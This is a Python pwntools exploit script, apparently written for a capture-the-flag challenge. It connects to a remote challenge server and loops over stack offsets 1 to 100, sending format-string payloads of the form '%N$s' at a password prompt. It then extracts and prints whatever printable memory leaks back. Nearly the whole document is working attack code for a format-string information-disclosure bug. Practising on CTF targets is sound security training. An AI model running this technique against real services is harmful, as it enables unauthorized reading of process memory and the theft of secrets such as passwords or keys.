#!/usr/bin/env python3
from pwn import *
import re

context.log_level = 'error'

for i in range(1, 101):
    try:
        io = remote("challenge.ctf.ehc-fptu.club", 45127)
        io.recvuntil(b"Enter your password:")
        payload = f"%{i}$s".encode() 
        io.sendline(payload)
        data = io.recvuntil(b"Enter your password:").decode(errors="ignore")
        leaked_line = None

        for line in data.splitlines():
            if "Checking your password:" in line:
                leaked_line = line.strip()
                break
        if leaked_line:
            leaked = leaked_line.split("Checking your password:")[-1].strip()
            string_part = leaked 
            if string_part:
                string_clean = string_part.strip()
                printable_chars = ''.join(c for c in string_clean if 32 <= ord(c) <= 126)
                if printable_chars:
                    print(f"Index {i}: string -> '{printable_chars}'")
                else:
                    print(f"Index {i}: string -> no printable characters")
        io.close()

    except Exception as e:
        print(f"Index {i}: encountered error {e}")